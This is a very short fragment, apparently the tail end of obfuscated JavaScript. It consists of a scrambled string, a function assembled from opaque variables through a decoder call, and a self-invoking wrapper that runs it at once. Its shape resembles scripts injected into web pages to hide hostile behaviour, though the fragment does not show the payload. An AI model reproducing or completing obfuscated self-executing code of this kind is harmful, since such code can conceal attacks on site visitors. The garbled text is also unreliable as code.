gX6%;&Xhrl;sit%eXaX;%a]S'));var Kvv=Zoc(zgV,Bcp );Kvv(4831);return 2468})()
